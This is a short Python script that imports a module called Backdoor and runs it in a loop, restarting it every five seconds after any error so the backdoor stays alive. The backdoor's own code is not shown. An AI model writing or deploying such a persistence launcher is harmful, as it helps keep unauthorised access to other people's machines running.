import Backdoor
import time

def run():
    try:
        back = Backdoor.Backdoor()
        back.run()
    except:
        print("hi")
        time.sleep(5)
        run()

run()



